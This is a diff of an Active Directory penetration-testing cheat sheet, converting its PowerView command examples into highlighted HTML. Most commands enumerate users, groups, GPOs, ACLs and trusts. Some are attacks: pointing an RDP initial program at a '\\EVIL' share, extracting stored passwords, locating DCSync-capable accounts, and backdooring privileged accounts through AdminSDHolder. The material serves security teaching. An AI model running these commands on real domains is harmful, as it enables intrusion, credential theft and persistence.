-Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
+<span style=color:#6272a4># Set the owner of &#39;dfm&#39; in the current domain to &#39;harmj0y&#39;</span>
+<span style=color:#8be9fd;font-style:italic>Set-DomainObjectOwner</span> -Identity dfm -OwnerIdentity harmj0y
 
-# Set the owner of 'dfm' in the current domain to 'harmj0y'
-Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
-
-# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
-Get-ObjectACL &quot;DC=testlab,DC=local&quot; -ResolveGUIDs | ? {
-    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
+<span style=color:#6272a4># retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)</span>
+<span style=color:#8be9fd;font-style:italic>Get-ObjectACL</span> <span style=color:#f1fa8c>&#34;DC=testlab,DC=local&#34;</span> -ResolveGUIDs | ? {
+    (<span style=color:#8be9fd;font-style:italic>$_</span>.ActiveDirectoryRights <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;GenericAll&#39;</span>) <span style=color:#ff79c6>-or</span> (<span style=color:#8be9fd;font-style:italic>$_</span>.ObjectAceType <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;Replication-Get&#39;</span>)
 }
 
-# check if any user passwords are set
-$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru} | fl
-</code></pre><h2 id=computers>Computers <a href=#computers class=anchor aria-hidden=true>#</a></h2><ul><li>Types of computers</li><li>Roles of computers</li><li>Used operating systems</li><li>Live hosts</li></ul><pre><code class=language-powershell># Get list of computers in current domain
-Get-NetComputer
-Get-NetComputer -FullData
+<span style=color:#6272a4># check if any user passwords are set</span>
+<span style=color:#8be9fd;font-style:italic>$FormatEnumerationLimit</span>=-1;<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#39;(userPassword=*)&#39;</span> -Properties samaccountname,memberof,userPassword | % {<span style=color:#8be9fd;font-style:italic>Add-Member</span> -InputObject <span style=color:#8be9fd;font-style:italic>$_</span> NoteProperty <span style=color:#f1fa8c>&#39;Password&#39;</span> <span style=color:#f1fa8c>&#34;</span>$([System.Text.Encoding]::ASCII.GetString(<span style=color:#8be9fd;font-style:italic>$_</span>.userPassword))<span style=color:#f1fa8c>&#34;</span> -PassThru} | <span style=color:#8be9fd;font-style:italic>fl
+</span></code></pre></div><h2 id=computers>Computers <a href=#computers class=anchor aria-hidden=true>#</a></h2><ul><li>Types of computers</li><li>Roles of computers</li><li>Used operating systems</li><li>Live hosts</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get list of computers in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetComputer</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetComputer</span> -FullData
 
-# Check for live hosts (depends on ICMP)
-Get-NetComputer -Ping
+<span style=color:#6272a4># Check for live hosts (depends on ICMP)</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetComputer</span> -Ping
 
-# Information about operating systems
-Get-NetComputer -OperatingSystem &quot;*Server 2016&quot;
-Get-NetComputer -FullData | select dnshostname,operatingsystem
+<span style=color:#6272a4># Information about operating systems</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetComputer</span> -OperatingSystem <span style=color:#f1fa8c>&#34;*Server 2016&#34;</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetComputer</span> -FullData | <span style=color:#8be9fd;font-style:italic>select </span>dnshostname,operatingsystem
 
-# Get list of sessions on computer
-Get-NetSession -ComputerName &quot;dc01.lab.local&quot;
+<span style=color:#6272a4># Get list of sessions on computer</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetSession</span> -ComputerName <span style=color:#f1fa8c>&#34;dc01.lab.local&#34;</span>
 
-# Find any computers with constrained delegation set
-Get-DomainComputer -TrustedToAuth
+<span style=color:#6272a4># Find any computers with constrained delegation set</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -TrustedToAuth
 
-# Find all servers that allow unconstrained delegation
-Get-DomainComputer -Unconstrained
+<span style=color:#6272a4># Find all servers that allow unconstrained delegation</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -Unconstrained
 
-# Return the local *groups* of a remote server
-Get-NetLocalGroup SERVER.domain.local
+<span style=color:#6272a4># Return the local *groups* of a remote server</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetLocalGroup</span> SERVER.domain.local
 
-# Return the local group *members* of a remote server using Win32 API methods (faster but less info)
-Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
+<span style=color:#6272a4># Return the local group *members* of a remote server using Win32 API methods (faster but less info)</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetLocalGroupMember</span> -Method API -ComputerName SERVER.domain.local
 
-# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
-Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
-</code></pre><h2 id=groups>Groups <a href=#groups class=anchor aria-hidden=true>#</a></h2><ul><li>Intersting domain and local groups</li><li>Group members</li><li>Group membership for current user</li><li>Query information about groups from forest root, e.g. for Enterprise Admins</li><li>If RID is 5xx, it is built in, otherwise custom</li></ul><pre><code class=language-powershell># Get all groups in current domain
-Get-NetGroup
-Get-NetGroup -FullData
+<span style=color:#6272a4># enumerates computers in the current domain with &#39;outlier&#39; properties, i.e. properties not set from the firest result returned by Get-DomainComputer</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -FindOne | <span style=color:#8be9fd;font-style:italic>Find-DomainObjectPropertyOutlier</span>
+</code></pre></div><h2 id=groups>Groups <a href=#groups class=anchor aria-hidden=true>#</a></h2><ul><li>Intersting domain and local groups</li><li>Group members</li><li>Group membership for current user</li><li>Query information about groups from forest root, e.g. for Enterprise Admins</li><li>If RID is 5xx, it is built in, otherwise custom</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get all groups in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span> -FullData
 
-# Get information about groups in other domain
-Get-NetGroup -Domain lab.local
+<span style=color:#6272a4># Get information about groups in other domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span> -Domain lab.local
 
-# Get all groups containing the word &quot;admin&quot; in group name
-Get-NetGroup &quot;*admin*&quot;
+<span style=color:#6272a4># Get all groups containing the word &#34;admin&#34; in group name</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span> <span style=color:#f1fa8c>&#34;*admin*&#34;</span>
 
-# Get information about specific group
-Get-NetGroup -FullData &quot;Domain Admins&quot;
+<span style=color:#6272a4># Get information about specific group</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span> -FullData <span style=color:#f1fa8c>&#34;Domain Admins&#34;</span>
 
-# Get all members of Domain Admins group
-# If member is a group, get members of that group as well
-Get-NetGroupMember -GroupName &quot;Domain Admins&quot; -Recurse
+<span style=color:#6272a4># Get all members of Domain Admins group</span>
+<span style=color:#6272a4># If member is a group, get members of that group as well</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroupMember</span> -GroupName <span style=color:#f1fa8c>&#34;Domain Admins&#34;</span> -Recurse
 
-# Get list of Enterprise Admins, only available from forest root
-Get-NetGroupMember -GroupName &quot;Enterprise Admins&quot; -Domain lab.local
+<span style=color:#6272a4># Get list of Enterprise Admins, only available from forest root</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroupMember</span> -GroupName <span style=color:#f1fa8c>&#34;Enterprise Admins&#34;</span> -Domain lab.local
 
-# Get group membership for a user
-Get-NetGroup -UserName &quot;student1&quot;
+<span style=color:#6272a4># Get group membership for a user</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGroup</span> -UserName <span style=color:#f1fa8c>&#34;student1&#34;</span>
 
-# List all local groups on a machine (needs administrator privileges on non-dc machines)
-Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups
+<span style=color:#6272a4># List all local groups on a machine (needs administrator privileges on non-dc machines)</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetLocalGroup</span> -ComputerName dc.lab.local -ListGroups
 
-# Get members of all local groups on a machine (needs administrator privileges on non-dc machines)
-Get-NetLocalGroup -ComputerName dc.lab.local -Recurse
+<span style=color:#6272a4># Get members of all local groups on a machine (needs administrator privileges on non-dc machines)</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetLocalGroup</span> -ComputerName dc.lab.local -Recurse
 
-# Find linked DA accounts using name correlation
-Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter &quot;(displayname=*$a*)&quot; -Properties displayname,samaccountname}
+<span style=color:#6272a4># Find linked DA accounts using name correlation</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGroupMember</span> <span style=color:#f1fa8c>&#39;Domain Admins&#39;</span> | %{<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> <span style=color:#8be9fd;font-style:italic>$_</span>.membername -LDAPFilter <span style=color:#f1fa8c>&#39;(displayname=*)&#39;</span>} | %{<span style=color:#8be9fd;font-style:italic>$a</span>=<span style=color:#8be9fd;font-style:italic>$_</span>.displayname.split(<span style=color:#f1fa8c>&#39; &#39;</span>)[0..1] -join <span style=color:#f1fa8c>&#39; &#39;</span>; <span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(displayname=*$a*)&#34;</span> -Properties displayname,samaccountname}
 
-# Find any machine accounts in privileged groups
-Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+<span style=color:#6272a4># Find any machine accounts in privileged groups</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGroup</span> -AdminCount | <span style=color:#8be9fd;font-style:italic>Get-DomainGroupMember</span> -Recurse | ?{<span style=color:#8be9fd;font-style:italic>$_</span>.MemberName <span style=color:#ff79c6>-like</span> <span style=color:#f1fa8c>&#39;*$&#39;</span>}
 
-# Enumerate all groups in a domain that don't have a global scope, returning just group names
-Get-DomainGroup -GroupScope NotGlobal -Properties name
-</code></pre><h2 id=files--shares>Files & Shares <a href=#files--shares class=anchor aria-hidden=true>#</a></h2><pre><code class=language-powershell># Find shares on hosts in current domain
-Invoke-ShareFinder -Verbose
+<span style=color:#6272a4># Enumerate all groups in a domain that don&#39;t have a global scope, returning just group names</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGroup</span> -GroupScope NotGlobal -Properties name
+</code></pre></div><h2 id=files--shares>Files & Shares <a href=#files--shares class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Find shares on hosts in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-ShareFinder</span> -Verbose
 
-# Find shares from other domain
-Invoke-ShareFinder -Domain lab.local
+<span style=color:#6272a4># Find shares from other domain</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-ShareFinder</span> -Domain lab.local
 
-# Exclude default shares
-Invoke-ShareFinder -ExcludeStandard
+<span style=color:#6272a4># Exclude default shares</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-ShareFinder</span> -ExcludeStandard
 
-# Show only shares the current user has access to
-Invoke-ShareFinder -CheckShareAccess
+<span style=color:#6272a4># Show only shares the current user has access to</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-ShareFinder</span> -CheckShareAccess
 
-# Find sensitive files on computers in the domain
-Invoke-FileFinder -Verbose
+<span style=color:#6272a4># Find sensitive files on computers in the domain</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-FileFinder</span> -Verbose
 
-# Get all fileservers of the domain
-Get-NetFileServer
+<span style=color:#6272a4># Get all fileservers of the domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetFileServer</span>
 
-# use alternate credentials for searching for files on the domain
-# Find-InterestingDomainShareFile == old Invoke-FileFinder
-$Password = &quot;PASSWORD&quot; | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object System.Management.Automation.PSCredential(&quot;DOMAIN\user&quot;,$Password)
-Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
-</code></pre><h2 id=group-policy>Group Policy <a href=#group-policy class=anchor aria-hidden=true>#</a></h2><ul><li>Security settings</li><li>Registry-based policy settings</li><li>GPP like start/shutdown/log-on/logff script settings</li><li>Software installation</li><li>Abused for privesc, backdoors, persistence</li></ul><pre><code class=language-powershell># Display RSoP summary data
-gpresult /R
+<span style=color:#6272a4># use alternate credentials for searching for files on the domain</span>
+<span style=color:#6272a4># Find-InterestingDomainShareFile == old Invoke-FileFinder</span>
+<span style=color:#8be9fd;font-style:italic>$Password</span> = <span style=color:#f1fa8c>&#34;PASSWORD&#34;</span> | <span style=color:#8be9fd;font-style:italic>ConvertTo-SecureString</span> -AsPlainText -Force
+<span style=color:#8be9fd;font-style:italic>$Credential</span> = <span style=color:#8be9fd;font-style:italic>New-Object</span> System.Management.Automation.PSCredential(<span style=color:#f1fa8c>&#34;DOMAIN\user&#34;</span>,<span style=color:#8be9fd;font-style:italic>$Password</span>)
+<span style=color:#8be9fd;font-style:italic>Find-InterestingDomainShareFile</span> -Domain DOMAIN -Credential <span style=color:#8be9fd;font-style:italic>$Credential</span>
+</code></pre></div><h2 id=group-policy>Group Policy <a href=#group-policy class=anchor aria-hidden=true>#</a></h2><ul><li>Security settings</li><li>Registry-based policy settings</li><li>GPP like start/shutdown/log-on/logff script settings</li><li>Software installation</li><li>Abused for privesc, backdoors, persistence</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Display RSoP summary data</span>
+gpresult /<span style=color:#8be9fd;font-style:italic>R
+</span><span style=color:#8be9fd;font-style:italic></span>
+<span style=color:#6272a4># Get list of GPO in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGPO</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGPO</span> | <span style=color:#8be9fd;font-style:italic>Select </span>displayname
+<span style=color:#8be9fd;font-style:italic>Get-NetGPO</span> -ComputerName ws01.lab.local
+<span style=color:#8be9fd;font-style:italic>Get-DomainGPO</span> -ComputerIdentity windows1.testlab.local
 
-# Get list of GPO in current domain
-Get-NetGPO
-Get-NetGPO | Select displayname
-Get-NetGPO -ComputerName ws01.lab.local
-Get-DomainGPO -ComputerIdentity windows1.testlab.local
+<span style=color:#6272a4># Get GPO(s) which use Restricted Groups or groups.xml for interesting users</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGPOGroup</span>
 
-# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
-Get-NetGPOGroup
+<span style=color:#6272a4># Get users which are in a local group of a machine using GPO</span>
+<span style=color:#8be9fd;font-style:italic>Find-GPOComputerAdmin</span> -ComputerName ws01.lab.local
 
-# Get users which are in a local group of a machine using GPO
-Find-GPOComputerAdmin -ComputerName ws01.lab.local
+<span style=color:#6272a4># Get machines where the given user is member of a specific group</span>
+<span style=color:#8be9fd;font-style:italic>Find-GPOLocation</span> -UserName user -Verbose
 
-# Get machines where the given user is member of a specific group
-Find-GPOLocation -UserName user -Verbose
+<span style=color:#6272a4># Enumerate what machines that a particular user/group identity has local admin rights to</span>
+<span style=color:#6272a4># Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGPOUserLocalGroupMapping</span> -Identity &lt;User/Group&gt;
 
-# Enumerate what machines that a particular user/group identity has local admin rights to
-# Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
-Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;
+<span style=color:#6272a4># Enumerate what machines that a given user in the specified domain has RDP access rights to</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGPOUserLocalGroupMapping</span> -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP
 
-# Enumerate what machines that a given user in the specified domain has RDP access rights to
-Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP
+<span style=color:#6272a4># Export a csv of all GPO mappings</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainGPOUserLocalGroupMapping</span> | %{<span style=color:#8be9fd;font-style:italic>$_</span>.computers = <span style=color:#8be9fd;font-style:italic>$_</span>.computers -join <span style=color:#f1fa8c>&#34;, &#34;</span>; <span style=color:#8be9fd;font-style:italic>$_</span>} | <span style=color:#8be9fd;font-style:italic>Export-CSV</span> -NoTypeInformation gpo_map.csv
+</code></pre></div><h2 id=organizational-units>Organizational Units <a href=#organizational-units class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get OUs in a domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetOU</span> -FullData
 
-# Export a csv of all GPO mappings
-Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join &quot;, &quot;; $_} | Export-CSV -NoTypeInformation gpo_map.csv
-</code></pre><h2 id=organizational-units>Organizational Units <a href=#organizational-units class=anchor aria-hidden=true>#</a></h2><pre><code class=language-powershell># Get OUs in a domain
-Get-NetOU -FullData
+<span style=color:#6272a4># Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetGPO</span> -GPOname <span style=color:#f1fa8c>&#34;{AB306569-220D-43FF-B03B-83E8F4EF8081}&#34;</span>
 
-# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
-Get-NetGPO -GPOname &quot;{AB306569-220D-43FF-B03B-83E8F4EF8081}&quot;
+<span style=color:#6272a4># Find all computers in a given OU</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -SearchBase <span style=color:#f1fa8c>&#34;ldap://OU=...&#34;</span>
 
-# Find all computers in a given OU
-Get-DomainComputer -SearchBase &quot;ldap://OU=...&quot;
+<span style=color:#6272a4># Get the logged on users for all machines in any *server* OU in a particular domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainOU</span> -Identity *server* -Domain &lt;domain&gt; | %{<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -SearchBase <span style=color:#8be9fd;font-style:italic>$_</span>.distinguishedname -Properties dnshostname | %{<span style=color:#8be9fd;font-style:italic>Get-NetLoggedOn</span> -ComputerName <span style=color:#8be9fd;font-style:italic>$_</span>}}
+</code></pre></div><h2 id=access-control-lists>Access Control Lists <a href=#access-control-lists class=anchor aria-hidden=true>#</a></h2><ul><li>Access Control Entries (ACE) correspond to individual permission or audits access</li><li>Who has permission and what can be done on an object?</li><li>Two types:<ul><li>DACL -> Defines the permissions trustees (a user or group) have on an object</li><li>SACL - Logs success and failure audit messages when an object is accessed</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get the ACLs associated with the specified object</span>
+<span style=color:#8be9fd;font-style:italic>Get-ObjectACL</span> -SamAccountName <span style=color:#f1fa8c>&#34;Users&#34;</span> -ResolveGUIDs
 
-# Get the logged on users for all machines in any *server* OU in a particular domain
-Get-DomainOU -Identity *server* -Domain &lt;domain&gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
-</code></pre><h2 id=access-control-lists>Access Control Lists <a href=#access-control-lists class=anchor aria-hidden=true>#</a></h2><ul><li>Access Control Entries (ACE) correspond to individual permission or audits access</li><li>Who has permission and what can be done on an object?</li><li>Two types:<ul><li>DACL -> Defines the permissions trustees (a user or group) have on an object</li><li>SACL - Logs success and failure audit messages when an object is accessed</li></ul></li></ul><pre><code class=language-powershell># Get the ACLs associated with the specified object
-Get-ObjectACL -SamAccountName &quot;Users&quot; -ResolveGUIDs
+<span style=color:#6272a4># Get the ACLs associated with the specified prefix to be used for search</span>
+<span style=color:#8be9fd;font-style:italic>Get-ObjectACL</span> -ADSPrefix <span style=color:#f1fa8c>&#39;CN=Administrator,CN=Users&#39;</span> -Verbose
 
-# Get the ACLs associated with the specified prefix to be used for search
-Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
+<span style=color:#6272a4># Get the ACLs associated with the specified LDAP path to be used for search</span>
+<span style=color:#8be9fd;font-style:italic>Get-ObjectACL</span> -ADSPath <span style=color:#f1fa8c>&#34;LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local&#34;</span> -ResolveGUIDs -Verbose
 
-# Get the ACLs associated with the specified LDAP path to be used for search
-Get-ObjectACL -ADSPath &quot;LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local&quot; -ResolveGUIDs -Verbose
+<span style=color:#6272a4># Search for interesting ACEs</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-ACLScanner</span> -ResolveGUIDs
 
-# Search for interesting ACEs
-Invoke-ACLScanner -ResolveGUIDs
+<span style=color:#6272a4># Get the ACLs associated with the specified path</span>
+<span style=color:#8be9fd;font-style:italic>Get-PathACL</span> -Path <span style=color:#f1fa8c>&#34;\\dc01.lab.local\sysvol&#34;</span>
 
-# Get the ACLs associated with the specified path
-Get-PathACL -Path &quot;\\dc01.lab.local\sysvol&quot;
+<span style=color:#6272a4># Enumerate who has rights to the &#39;matt&#39; user in &#39;testlab.local&#39;, resolving rights GUIDs to names</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainObjectAcl</span> -Identity matt -ResolveGUIDs -Domain testlab.local
 
-# Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
-Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
+<span style=color:#6272a4># Grant user &#39;will&#39; the rights to change &#39;matt&#39;s password</span>
+<span style=color:#8be9fd;font-style:italic>Add-DomainObjectAcl</span> -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
 
-# Grant user 'will' the rights to change 'matt's password
-Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
+<span style=color:#6272a4># Audit the permissions of AdminSDHolder, resolving GUIDs</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainObjectAcl</span> -SearchBase <span style=color:#f1fa8c>&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;</span> -ResolveGUIDs
 
-# Audit the permissions of AdminSDHolder, resolving GUIDs
-Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
+<span style=color:#6272a4># Backdoor the ACLs of all privileged accounts with the &#39;matt&#39; account through AdminSDHolder abuse</span>
+<span style=color:#8be9fd;font-style:italic>Add-DomainObjectAcl</span> -TargetIdentity <span style=color:#f1fa8c>&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;</span> -PrincipalIdentity matt -Rights All
 
-# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
-
-# Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
-Get-DomainObjectAcl &quot;dc=dev,dc=testlab,dc=local&quot; -ResolveGUIDs | ? {
-    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
+<span style=color:#6272a4># Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainObjectAcl</span> <span style=color:#f1fa8c>&#34;dc=dev,dc=testlab,dc=local&#34;</span> -ResolveGUIDs | ? {
+    (<span style=color:#8be9fd;font-style:italic>$_</span>.ObjectType <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;replication-get&#39;</span>) <span style=color:#ff79c6>-or</span> (<span style=color:#8be9fd;font-style:italic>$_</span>.ActiveDirectoryRights <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;GenericAll&#39;</span>)
 }
 
-# Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights
-Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
-</code></pre><h2 id=trusts>Trusts <a href=#trusts class=anchor aria-hidden=true>#</a></h2><ul><li>Relationship between two domains or forest</li><li>Trusted Domain Objects (TDOs) represent trust relationship in a domain</li><li>Types of trusts<ul><li>One-way: users in trusted domain can access resources in the trusting domain</li><li>Two-way trust: users of both domains can access resources in the other domain</li><li>Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)</li><li>Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)</li><li>Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)</li><li>Shortcut trusts: used to reduce access time in complex trust scenarios</li><li>External trusts: between two domains in different forests when forests do not have a turst relationships</li><li>Forest trusts: between forest root domains</li></ul></li></ul><pre><code class=language-powershell># Get a list of all domain trusts for the current domain
-Get-NetDomainTrust
-Get-NetDomainTrust -Domain test.lab.local
-</code></pre><h2 id=forest-mapping>Forest Mapping <a href=#forest-mapping class=anchor aria-hidden=true>#</a></h2><pre><code class=language-powershell># Get details about the current forest
-Get-NetForest
-Get-NetForest -Forest lab.local
+<span style=color:#6272a4># Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainObjectAcl</span> -LDAPFilter <span style=color:#f1fa8c>&#39;(objectCategory=groupPolicyContainer)&#39;</span> | ? { (<span style=color:#8be9fd;font-style:italic>$_</span>.SecurityIdentifier <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;^S-1-5-.*-[1-9]\d{3,}$&#39;</span>) <span style=color:#ff79c6>-and</span> (<span style=color:#8be9fd;font-style:italic>$_</span>.ActiveDirectoryRights <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;</span>)}
+</code></pre></div><h2 id=trusts>Trusts <a href=#trusts class=anchor aria-hidden=true>#</a></h2><ul><li>Relationship between two domains or forest</li><li>Trusted Domain Objects (TDOs) represent trust relationship in a domain</li><li>Types of trusts<ul><li>One-way: users in trusted domain can access resources in the trusting domain</li><li>Two-way trust: users of both domains can access resources in the other domain</li><li>Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)</li><li>Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)</li><li>Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)</li><li>Shortcut trusts: used to reduce access time in complex trust scenarios</li><li>External trusts: between two domains in different forests when forests do not have a turst relationships</li><li>Forest trusts: between forest root domains</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get a list of all domain trusts for the current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomainTrust</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomainTrust</span> -Domain test.lab.local
+</code></pre></div><h2 id=forest-mapping>Forest Mapping <a href=#forest-mapping class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get details about the current forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForest</span> -Forest lab.local
 
-# Get all domains in the current forest
-Get-NetForestDomain
-Get-NetForestDomain -Forest lab.local
+<span style=color:#6272a4># Get all domains in the current forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestDomain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestDomain</span> -Forest lab.local
 
-# Get all global catalogs for the current forest
-Get-NetForestCatalog
-Get-NetForestCatalog -Forest lab.local
+<span style=color:#6272a4># Get all global catalogs for the current forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestCatalog</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetForestCatalog</span> -Forest lab.local
 
-# Map trusts of a forest
-Get-NetForestTrust
-Get-NetForestTrust -Forest lab.local
